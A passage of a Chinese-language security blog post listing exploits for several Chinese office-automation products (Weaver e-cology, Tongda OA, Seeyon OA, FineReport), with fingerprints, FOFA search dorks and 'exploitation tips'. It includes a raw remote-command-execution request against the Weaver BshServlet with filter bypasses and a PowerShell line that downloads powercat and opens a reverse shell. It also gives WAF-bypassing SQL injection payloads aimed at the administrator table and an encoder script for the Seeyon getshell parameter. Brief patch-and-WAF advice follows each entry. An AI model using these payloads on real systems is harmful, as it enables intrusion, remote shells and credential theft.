<span class="hljs-regexp">//</span>                <span class="hljs-string">"        &lt;/default&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"      &lt;/javax.sql.rowset.BaseRowSet&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"      &lt;com.sun.rowset.JdbcRowSetImpl&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"        &lt;default&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;iMatchColumns&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;int&gt;-1&lt;/int&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;int&gt;-1&lt;/int&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;int&gt;-1&lt;/int&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;int&gt;-1&lt;/int&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;int&gt;-1&lt;/int&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;int&gt;-1&lt;/int&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;int&gt;-1&lt;/int&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;int&gt;-1&lt;/int&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;int&gt;-1&lt;/int&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;int&gt;-1&lt;/int&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;/iMatchColumns&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;strMatchColumns&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;string&gt;foo&lt;/string&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;null/&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;null/&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;null/&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;null/&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;null/&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;null/&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;null/&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;null/&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;null/&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;/strMatchColumns&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"        &lt;/default&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"      &lt;/com.sun.rowset.JdbcRowSetImpl&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"    &lt;/com.sun.rowset.JdbcRowSetImpl&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"    &lt;com.sun.rowset.JdbcRowSetImpl reference=\"../com.sun.rowset.JdbcRowSetImpl\"/&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"  &lt;/java.util.PriorityQueue&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"&lt;/java.util.PriorityQueue&gt;"</span>;
        xStream.fromXML(payload);
    }
}</code></pre>

<p><strong>7. 利用技巧</strong></p>
<p>1.这里 <code>Xstream</code> 同样影响很多使用它的开源组件, 比如<code>Spring</code>系列</p>
<p>Maven Repository: com.thoughtworks.xstream » xstream » 1.4.10 (Usages)<br><a href="https://mvnrepository.com/artifact/com.thoughtworks.xstream/xstream/1.4.10/usages" target="_blank" rel="noopener">https://mvnrepository.com/artifact/com.thoughtworks.xstream/xstream/1.4.10/usages</a></p>
<p>2.xml 不仅可以xxe, 还能反序列化代码执行</p>
<p>2.xxe 漏洞用 <code>xxer</code>, 方便快捷</p>
<p>TheTwitchy/xxer: A blind XXE injection callback handler. Uses HTTP and FTP to extract information. Originally written in Ruby by ONsec-Lab.<br><a href="https://github.com/TheTwitchy/xxer" target="_blank" rel="noopener">https://github.com/TheTwitchy/xxer</a></p>
<p><strong>8. 防护方法</strong></p>
<p>1.升级到最新版</p>
<h2 id="泛微OA-Bsh-远程代码执行漏洞"><a href="#泛微OA-Bsh-远程代码执行漏洞" class="headerlink" title="泛微OA Bsh 远程代码执行漏洞"></a>泛微OA Bsh 远程代码执行漏洞</h2><p><strong>1. 漏洞简介</strong></p>
<p>2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁, 泛微e-cology OA系统的Java Beanshell接口可被未授权访问, 攻击者调用该Beanshell接口, 可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行, 漏洞等级严重.</p>
<p><strong>2. 影响组件</strong><br>泛微OA</p>
<p><strong>3. 漏洞指纹</strong></p>
<pre><code class="hljs gams"><span class="hljs-keyword">Set</span>-Cookie: ecology_JSessionId=
ecology
/weaver/bsh.servlet.BshServlet</code></pre>

<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"泛微-协同办公OA"</span></code></pre>

<p><strong>5. 漏洞分析</strong></p>
<p>泛微OA E-cology远程代码执行漏洞原理分析 – FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/vuls/215218.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/215218.html</a></p>
<p><a href="https://github.com/beanshell/beanshell" target="_blank" rel="noopener">https://github.com/beanshell/beanshell</a></p>
<p><a href="http://beanshell.org/manual/quickstart.html#The_BeanShell_GUI" target="_blank" rel="noopener">http://beanshell.org/manual/quickstart.html#The_BeanShell_GUI</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>Vulnerability-analysis/0917/weaver-oa/CNVD-2019-32204 at master · myzing00/Vulnerability-analysis<br><a href="https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204" target="_blank" rel="noopener">https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204</a></p>
<pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/weaver/bsh.servlet.BshServlet</span> HTTP/1.1
<span class="hljs-attribute">Host</span>: xxxxxxxx:8088
<span class="hljs-attribute">Accept</span>: */*
<span class="hljs-attribute">Accept-Language</span>: en
<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
<span class="hljs-attribute">Connection</span>: close
<span class="hljs-attribute">Content-Length</span>: 98
<span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded

bsh.script=eval%00("ex"%2b"ec(\"whoami\")");&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw</code></pre>

<p><strong>7. 利用技巧</strong></p>
<p>1.其他形式绕过</p>
<pre><code class="hljs lsl">eval%<span class="hljs-number">00</span>(<span class="hljs-string">"ex"</span>%<span class="hljs-number">2</span>b<span class="hljs-string">"ec(<span class="hljs-subst">\"</span>whoami<span class="hljs-subst">\"</span>)"</span>);` 也可以换成 `ex\u0065c(<span class="hljs-string">"cmd /c dir"</span>);</code></pre>

<p>2.泛微多数都是windows环境, 反弹shell可以使用pcat</p>
<pre><code class="hljs reasonml">powershell <span class="hljs-constructor">IEX(New-Object System.Net.Webclient)</span>.<span class="hljs-constructor">DownloadString('<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">raw</span>.<span class="hljs-params">githubusercontent</span>.<span class="hljs-params">com</span><span class="hljs-operator">/</span><span class="hljs-params">besimorhino</span><span class="hljs-operator">/</span><span class="hljs-params">powercat</span><span class="hljs-operator">/</span><span class="hljs-params">master</span><span class="hljs-operator">/</span><span class="hljs-params">powercat</span>.<span class="hljs-params">ps1</span>')</span>;powercat -c ip -p <span class="hljs-number">6666</span> -e cmd</code></pre>

<p><strong>8. 防护方法</strong></p>
<p>1.及时更新泛微补丁</p>
<p>2.拦截<code>/weaver/bsh.servlet.BshServlet</code>目录的访问</p>
<h2 id="泛微OA-e-cology-SQL注入漏洞"><a href="#泛微OA-e-cology-SQL注入漏洞" class="headerlink" title="泛微OA e-cology SQL注入漏洞"></a>泛微OA e-cology SQL注入漏洞</h2><p><strong>1. 漏洞简介</strong></p>
<p>泛微OA 在国内的用户很多, 漏洞以前也很多, 但现在在漏洞盒子托管了企业SRC <a href="https://weaversrc.vulbox.com/" target="_blank" rel="noopener">https://weaversrc.vulbox.com/</a>, 情况有所好转</p>
<p><strong>2. 影响组件</strong></p>
<p>泛微OA</p>
<p><strong>3. 漏洞指纹</strong></p>
<pre><code class="hljs gams"><span class="hljs-keyword">Set</span>-Cookie: ecology_JSessionId=
ecology
WorkflowCenterTreeData
/mobile/plugin/SyncUserInfo.jsp</code></pre>

<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"泛微-协同办公OA"</span></code></pre>

<p><strong>5. 漏洞分析</strong></p>
<p>泛微OA WorkflowCenterTreeData接口注入漏洞(限oracle数据库) – 先知社区<br><a href="https://xz.aliyun.com/t/6531" target="_blank" rel="noopener">https://xz.aliyun.com/t/6531</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>泛微OA e-cology WorkflowCenterTreeData前台接口SQL注入漏洞复现<em>数据库</em>小龙人-CSDN博客<br><a href="https://blog.csdn.net/zycdn/article/details/102494037" target="_blank" rel="noopener">https://blog.csdn.net/zycdn/article/details/102494037</a></p>
<p>Tentacle/ecology8_mobile_sql_inject.py at 6e1cecd52b10526c4851a26249339367101b3ca2 · orleven/Tentacle<br><a href="https://github.com/orleven/Tentacle/blob/6e1cecd52b10526c4851a26249339367101b3ca2/script/ecology/ecology8_mobile_sql_inject.py" target="_blank" rel="noopener">https://github.com/orleven/Tentacle/blob/6e1cecd52b10526c4851a26249339367101b3ca2/script/ecology/ecology8_mobile_sql_inject.py</a></p>
<p>应用安全 – 软件漏洞 – 泛微OA漏洞汇总 – AdreamWillB – 博客园<br><a href="https://www.cnblogs.com/AtesetEnginner/p/11558469.html" target="_blank" rel="noopener">https://www.cnblogs.com/AtesetEnginner/p/11558469.html</a></p>
<p><code>/mobile/plugin/SyncUserInfo.jsp</code> 这个也是有问题的, 但由于没有公开的分析报告, 漏洞相对简单, 这里不过多描述</p>
<p><strong>7. 利用技巧</strong></p>
<p>1.在这个漏洞补丁之前大概有几十个前台注入, 都差不多, 因为没公开这里就不细说了</p>
<p>2.泛微的补丁中间改过一次过滤策略, 打完所有补丁的话, 注入就很难了</p>
<p>3.这里可以绕过的原因是泛微某个过滤器初始化错误, 当长度超过<code>xssMaxLength=500</code>的时候就不进入安全检测, 修复以后是<code>xssMaxLength=1000000</code>, 所以随便你填充<code>%0a%0d</code>还是<code>空格</code>都可以绕过注入检测</p>
<p>4.泛微后端数据库版本存在差异, 但是可以通用检测</p>
<p>已知泛微OA E8存在2个版本的数据库, 一个是mssql, 一个是oracle, 且新旧版本泛微的sql过滤方法并不一致</p>
<p>所以这里筛选出一个相对通用的检测手法(下面代码是python的<code>" "*800</code> 800个空格)</p>
<pre><code class="hljs yaml"><span class="hljs-string">"-1) "</span><span class="hljs-string">+"</span> <span class="hljs-string">"*800+ "</span><span class="hljs-string">union</span> <span class="hljs-string">select/**/1,</span> <span class="hljs-literal">Null</span><span class="hljs-string">,</span> <span class="hljs-literal">Null</span><span class="hljs-string">,</span> <span class="hljs-literal">Null</span><span class="hljs-string">,</span> <span class="hljs-literal">Null</span><span class="hljs-string">,</span> <span class="hljs-literal">Null</span><span class="hljs-string">,</span> <span class="hljs-literal">Null</span><span class="hljs-string">,</span> <span class="hljs-literal">Null</span> <span class="hljs-string">from</span> <span class="hljs-string">Hrmresourcemanager</span> <span class="hljs-string">where</span> <span class="hljs-string">loginid=('sysadmin'"</span></code></pre>

<p>老版本可以在关键字后面加 <code>/**/</code> 来绕过sql检测</p>
<p>新版本可以通过加入大量空格/换行来绕过sql检测</p>
<p>mssql, oracle中都有<code>Hrmresourcemanager</code> , 这是管理员信息表</p>
<p>就<code>Hrmresource</code>表中没有用户, <code>Hrmresourcemanager</code> 表中也一定会存在<code>sysadmin</code>账户</p>
<p>所以进行<code>union select</code>的时候一定会有数据</p>
<p>这里也可以使用 <code>"-1) "+" "*800+ " or/**/ 1=1 and id&lt;(5"</code></p>
<p>这里使用 <code>&lt;5</code> 可以避免信息超过5条, 但是会返回密码等敏感信息, 不建议使用</p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时更新泛微补丁<br>2.泛微最好不要开放到公网<br>3.使用waf拦击</p>
<h2 id="泛微OA-数据库泄露漏洞"><a href="#泛微OA-数据库泄露漏洞" class="headerlink" title="泛微OA 数据库泄露漏洞"></a>泛微OA 数据库泄露漏洞</h2><p><strong>1. 漏洞简介</strong></p>
<p>泛微OA 在国内的用户很多, 漏洞以前也很多, 但现在在漏洞盒子托管了企业SRC <a href="https://weaversrc.vulbox.com/" target="_blank" rel="noopener">https://weaversrc.vulbox.com/</a>, 情况有所好转</p>
<p><strong>2. 影响组件</strong></p>
<p>泛微OA</p>
<p><strong>3. 漏洞指纹</strong></p>
<pre><code class="hljs gams"><span class="hljs-keyword">Set</span>-Cookie: ecology_JSessionId=
ecology
/mobile/DBconfigReader.jsp</code></pre>

<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"泛微-协同办公OA"</span></code></pre>

<p><strong>5. 漏洞分析</strong></p>
<p>jas502n/DBconfigReader: 泛微ecology OA系统接口存在数据库配置信息泄露漏洞<br><a href="https://github.com/jas502n/DBconfigReader" target="_blank" rel="noopener">https://github.com/jas502n/DBconfigReader</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>linbing/Weaver_Ecology_Oa_Config.py at master · taomujian/linbing<br>[<a href="https://github.com/taomujian/linbing/blob/master/flask/app/plugins/Weaver%20Ecology%20OA/Weaver_Ecology_Oa_Config.py]" target="_blank" rel="noopener">https://github.com/taomujian/linbing/blob/master/flask/app/plugins/Weaver%20Ecology%20OA/Weaver_Ecology_Oa_Config.py]</a>(<a href="https://github.com/taomujian/linbing/blob/master/flask/app/plugins/Weaver" target="_blank" rel="noopener">https://github.com/taomujian/linbing/blob/master/flask/app/plugins/Weaver</a> Ecology OA/Weaver_Ecology_Oa_Config.py)</p>
<p><strong>7. 利用技巧</strong></p>
<p>1.虽然是接口返回数据是加密的, 但是因为硬编码密钥的缘故, 解密也很简单, pydes就可以解密, 只是这里pydes本身有个bug, 修复方式 <code>pyDes.des(' ')</code><br>2.这里解密出来的密码一般都是泛微默认的, 且数据库监听在127.0.0.1上, 用处看个人发挥了<br>3.此外泛微还有一些漏洞, 但是基本最新版都修复了, 由于没公开过, 就让他消失吧</p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时更新泛微补丁</p>
<p>2.泛微最好不要开放到公网</p>
<p>3.使用waf拦截sql注入</p>
<h2 id="通达OA-远程代码执行漏洞"><a href="#通达OA-远程代码执行漏洞" class="headerlink" title="通达OA 远程代码执行漏洞"></a>通达OA 远程代码执行漏洞</h2><p><strong>1. 漏洞简介</strong></p>
<p>通达OA 在国内的用户也比较多, 虽说代码加了密, 奈何是Zend5.4, 解码很简单, 然后代码中的漏洞就很清楚, 尤其是变量覆盖和注入</p>
<p><strong>2. 影响组件</strong><br>通达OA</p>
<p><strong>3. 漏洞指纹</strong></p>
<pre><code class="hljs groovy"><span class="hljs-string">"/images/tongda.ico"</span>&gt;
Office Anywhere <span class="hljs-number">20</span>xx版 网络智能办公系统
<span class="hljs-regexp">/ispirit/</span><span class="hljs-class"><span class="hljs-keyword">interface</span>/<span class="hljs-title">gateway</span>.<span class="hljs-title">php</span></span></code></pre>

<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"通达OA"</span></code></pre>

<p><strong>5. 漏洞分析</strong></p>
<p>note/readme.md at c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86 · leezp/note<br><a href="https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313通达OA/readme.md" target="_blank" rel="noopener">https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313%E9%80%9A%E8%BE%BEOA/readme.md</a></p>
<p>代码审计 | 通达OA 任意用户登录漏洞（匿名RCE）分析 | zrools<br><a href="https://www.zrools.org/2020/04/23/代码审计-通达OA-任意用户登录漏洞（匿名RCE）分析/" target="_blank" rel="noopener">https://www.zrools.org/2020/04/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E9%80%9A%E8%BE%BEOA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%8C%BF%E5%90%8DRCE%EF%BC%89%E5%88%86%E6%9E%90/</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>note/readme.md at c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86 · leezp/note<br><a href="https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313通达OA/readme.md" target="_blank" rel="noopener">https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313%E9%80%9A%E8%BE%BEOA/readme.md</a></p>
<p>NS-Sp4ce/TongDaOA-Fake-User: 通达OA 任意用户登录漏洞<br><a href="https://github.com/NS-Sp4ce/TongDaOA-Fake-User" target="_blank" rel="noopener">https://github.com/NS-Sp4ce/TongDaOA-Fake-User</a></p>
<p>tools/tongda_v11.4_rce_exp.py at master · zrools/tools 管理员伪造后sql写shell<br><a href="https://github.com/zrools/tools/blob/master/python/tongda_v11.4_rce_exp.py" target="_blank" rel="noopener">https://github.com/zrools/tools/blob/master/python/tongda_v11.4_rce_exp.py</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.这个漏洞也很简单, 发预警的当天就分析出来了, 一个上传, 一个包含, 主要是文件包含漏洞的/ispirit/interface/gateway.php文件在v11才有</p>
<p>绕过disable_function也很简单, 直接调用<code>COM('WScript.shell')</code>组件就ok了</p>
<p>2.文件名结构规则如下</p>
<pre><code class="hljs angelscript"><span class="hljs-symbol">256@</span><span class="hljs-number">2003</span>_ <span class="hljs-number">2055499620</span>|<span class="hljs-number">123.</span> php.</code></pre>

<p>对应文件名为</p>
<pre><code class="hljs lsl"><span class="hljs-section">attach</span>/im/<span class="hljs-number">2003</span>/<span class="hljs-number">2055499620.123</span>.php</code></pre>

<p>因为是windows的, <code>1.php.</code> 可以绕过黑名单, 写到文件就成了 <code>1.php</code> (<del>这里是文件包含, 文件名无所谓</del>)</p>
<p>3.2020年4月20号爆出任意用户伪造登录, 这里小伙伴测试 2017 和 v11 的 poc 好像可以用同一个</p>
<p>(我们看标题挖漏洞, 全网第一时间推送了带复现截图的漏洞通告, 也引发了大家不少讨论)</p>
<p>通达OA前台任意用户伪造登录漏洞<br><a href="https://vas.riskivy.com/vuln-detail?id=33" target="_blank" rel="noopener">https://vas.riskivy.com/vuln-detail?id=33</a></p>
<p>NS-Sp4ce/TongDaOA-Fake-User: 通达OA 任意用户登录漏洞<br><a href="https://github.com/NS-Sp4ce/TongDaOA-Fake-User" target="_blank" rel="noopener">https://github.com/NS-Sp4ce/TongDaOA-Fake-User</a></p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁</p>
<p>2.使用waf拦截</p>
<h2 id="致远-OA-A8-htmlofficeservlet-getshell-漏洞"><a href="#致远-OA-A8-htmlofficeservlet-getshell-漏洞" class="headerlink" title="致远 OA A8 htmlofficeservlet getshell 漏洞"></a>致远 OA A8 htmlofficeservlet getshell 漏洞</h2><p><strong>1. 漏洞简介</strong></p>
<p>致远 OA 在国内的用户也比较多, 2019年攻防演练暴出来 htmlofficeservlet getshell 漏洞</p>
<p><strong>2. 影响组件</strong><br>致远 OA</p>
<p><strong>3. 漏洞指纹</strong></p>
<pre><code class="hljs awk"><span class="hljs-regexp">/seeyon/</span>htmlofficeservlet
<span class="hljs-regexp">/seeyon/i</span>ndex.jsp
seeyon</code></pre>

<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"用友-致远OA"</span></code></pre>

<p><strong>5. 漏洞分析</strong></p>
<p>致远 OA A8 htmlofficeservlet getshell (POC&amp;EXP) – Reber’s Blog<br><a href="http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/" target="_blank" rel="noopener">http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>timwhitez/seeyon-OA-A8-GetShell: 致远OA A8 某些版本批量getshell漏洞/seeyon OA A8 some version getshell from url list<br><a href="https://github.com/timwhitez/seeyon-OA-A8-GetShell" target="_blank" rel="noopener">https://github.com/timwhitez/seeyon-OA-A8-GetShell</a></p>
<p>致远 OA A8 htmlofficeservlet getshell (POC&amp;EXP) – Reber’s Blog<br><a href="http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/" target="_blank" rel="noopener">http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/</a></p>
<p>这里还有个XXE</p>
<p>致远OA帆软报表组件前台XXE漏洞(0day)挖掘过程 LandGrey’s Blog<br><a href="https://landgrey.me/blog/8/" target="_blank" rel="noopener">https://landgrey.me/blog/8/</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.这个漏洞也挺有意思的, 这个接口是一个金格iweboffice用来处理文件的, 属于一个第三方接口暴露导致的安全问题</p>
<p>这个漏洞网传的脚本都是一个文件名test123456.jsp, 很容易被人锤啊</p>
<p>这里贴一个小脚本可以加解密文件名属性之类的, 算法也很简单, 漏洞通告的当天就写出来了, 就是一个换了码表的base64</p>
<pre><code class="hljs vim">from sys import <span class="hljs-built_in">argv</span>

letters = <span class="hljs-string">"gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6"</span>


def base64_encode(input_str):
    str_ascii_list = [<span class="hljs-string">'{:0&gt;8}'</span>.format(str(bin(ord(i))).replace(<span class="hljs-string">'0b'</span>, <span class="hljs-string">''</span>))
                      <span class="hljs-keyword">for</span> i in input_str]
    output_str = <span class="hljs-string">''</span>
    equal_num = <span class="hljs-number">0</span>
    <span class="hljs-keyword">while</span> str_ascii_lis<span class="hljs-variable">t:</span>
        temp_list = str_ascii_list[:<span class="hljs-number">3</span>]
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(temp_list) != <span class="hljs-number">3</span>:
            <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(temp_list) &lt; <span class="hljs-number">3</span>:
                equal_num += <span class="hljs-number">1</span>
                temp_list += [<span class="hljs-string">'0'</span> * <span class="hljs-number">8</span>]
        temp_str = <span class="hljs-string">''</span>.<span class="hljs-keyword">join</span>(temp_list)
        temp_str_list = [temp_str[<span class="hljs-keyword">x</span>:<span class="hljs-keyword">x</span> + <span class="hljs-number">6</span>] <span class="hljs-keyword">for</span> <span class="hljs-keyword">x</span> in [<span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">12</span>, <span class="hljs-number">18</span>]]
        temp_str_list = [<span class="hljs-keyword">int</span>(<span class="hljs-keyword">x</span>, <span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> <span class="hljs-keyword">x</span> in temp_str_list]
        <span class="hljs-keyword">if</span> equal_num:
            temp_str_list = temp_str_list[<span class="hljs-number">0</span>:<span class="hljs-number">4</span> - equal_num]
        output_str += <span class="hljs-string">''</span>.<span class="hljs-keyword">join</span>([letters[<span class="hljs-keyword">x</span>] <span class="hljs-keyword">for</span> <span class="hljs-keyword">x</span> in temp_str_list])
        str_ascii_list = str_ascii_list[<span class="hljs-number">3</span>:]
    output_str = output_str + <span class="hljs-string">'='</span> * equal_num
    <span class="hljs-keyword">return</span> output_str


def base64_decode(input_str):
    str_ascii_list = [<span class="hljs-string">'{:0&gt;6}'</span>.format(str(bin(letters.<span class="hljs-built_in">index</span>(i))).replace(<span class="hljs-string">'0b'</span>, <span class="hljs-string">''</span>))
                      <span class="hljs-keyword">for</span> i in input_str <span class="hljs-keyword">if</span> i != <span class="hljs-string">'='</span>]
    output_str = <span class="hljs-string">''</span>
    equal_num = input_str.<span class="hljs-built_in">count</span>(<span class="hljs-string">'='</span>)
    <span class="hljs-keyword">while</span> str_ascii_lis<span class="hljs-variable">t:</span>
        temp_list = str_ascii_list[:<span class="hljs-number">4</span>]
        temp_str = <span class="hljs-string">''</span>.<span class="hljs-keyword">join</span>(temp_list)
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(temp_str) % <span class="hljs-number">8</span> != <span class="hljs-number">0</span>:
            temp_str = temp_str[<span class="hljs-number">0</span>:-<span class="hljs-number">1</span> * equal_num * <span class="hljs-number">2</span>]
        temp_str_list = [temp_str[<span class="hljs-keyword">x</span>:<span class="hljs-keyword">x</span> + <span class="hljs-number">8</span>] <span class="hljs-keyword">for</span> <span class="hljs-keyword">x</span> in [<span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">16</span>]]
        temp_str_list = [<span class="hljs-keyword">int</span>(<span class="hljs-keyword">x</span>, <span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> <span class="hljs-keyword">x</span> in temp_str_list <span class="hljs-keyword">if</span> <span class="hljs-keyword">x</span>]
        output_str += <span class="hljs-string">''</span>.<span class="hljs-keyword">join</span>([chr(<span class="hljs-keyword">x</span>) <span class="hljs-keyword">for</span> <span class="hljs-keyword">x</span> in temp_str_list])
        str_ascii_list = str_ascii_list[<span class="hljs-number">4</span>:]
    <span class="hljs-keyword">return</span> output_str


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">argv</span>) == <span class="hljs-number">2</span>:
        <span class="hljs-keyword">print</span>(base64_decode(<span class="hljs-built_in">argv</span>[<span class="hljs-number">1</span>]))
    elif <span class="hljs-built_in">len</span>(<span class="hljs-built_in">argv</span>) == <span class="hljs-number">3</span>:
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">argv</span>[<span class="hljs-number">1</span>] == <span class="hljs-string">'-d'</span>:
            <span class="hljs-keyword">print</span>(base64_decode(<span class="hljs-built_in">argv</span>[<span class="hljs-number">2</span>]))
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">print</span>(base64_encode(<span class="hljs-built_in">argv</span>[<span class="hljs-number">2</span>]))
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">print</span>(<span class="hljs-string">"Seeyon OA /seeyon/htmlofficeservlet param encode/decode"</span>)
        <span class="hljs-keyword">print</span>(<span class="hljs-string">"Usage:"</span>)
        <span class="hljs-keyword">print</span>(<span class="hljs-string">"python %s encoded_str"</span> % <span class="hljs-built_in">argv</span>[<span class="hljs-number">0</span>])t
        <span class="hljs-keyword">print</span>(<span class="hljs-string">"python %s -d encoded_str"</span> % <span class="hljs-built_in">argv</span>[<span class="hljs-number">0</span>])
        <span class="hljs-keyword">print</span>(<span class="hljs-string">"python %s -e raw_str"</span> % <span class="hljs-built_in">argv</span>[<span class="hljs-number">0</span>])</code></pre>

<p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁</p>
<p>2.使用waf拦截</p>
<h2 id="致远OA-帆软报表-seeyonreport-远程代码执行"><a href="#致远OA-帆软报表-seeyonreport-远程代码执行" class="headerlink" title="[致远OA] 帆软报表 seeyonreport 远程代码执行"></a>[致远OA] 帆软报表 seeyonreport 远程代码执行</h2><p><strong>1. 漏洞简介</strong></p>
<p>帆软报表 (seeyonreport) 很多时候会跟合致远OA一起出现, 通常用户还不知道, 所以这里有几个漏洞点</p>
<p><strong>2. 影响组件</strong></p>
<p>帆软报表 seeyonreport</p>
<p><strong>3. 漏洞指纹</strong></p>
<pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>seeyoon.com<span class="hljs-regexp">/seeyonreport/</span>ReportServer?op=fs_load&amp;cmd=fs_signin&amp;_=<span class="hljs-number">1560911828892</span>
seeyonreport</code></pre>

<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"用友-致远OA"</span></code></pre>

<p><strong>5. 漏洞分析</strong></p>
<p>帆软报表v8.0 Getshell漏洞分析 | ADog’s Blog<br><a href="http://foreversong.cn/archives/1378" target="_blank" rel="noopener">http://foreversong.cn/archives/1378</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>帆软报表v8.0 Getshell漏洞分析 | ADog’s Blog<br><a href="http://foreversong.cn/archives/1378" target="_blank" rel="noopener">http://foreversong.cn/archives/1378</a></p>
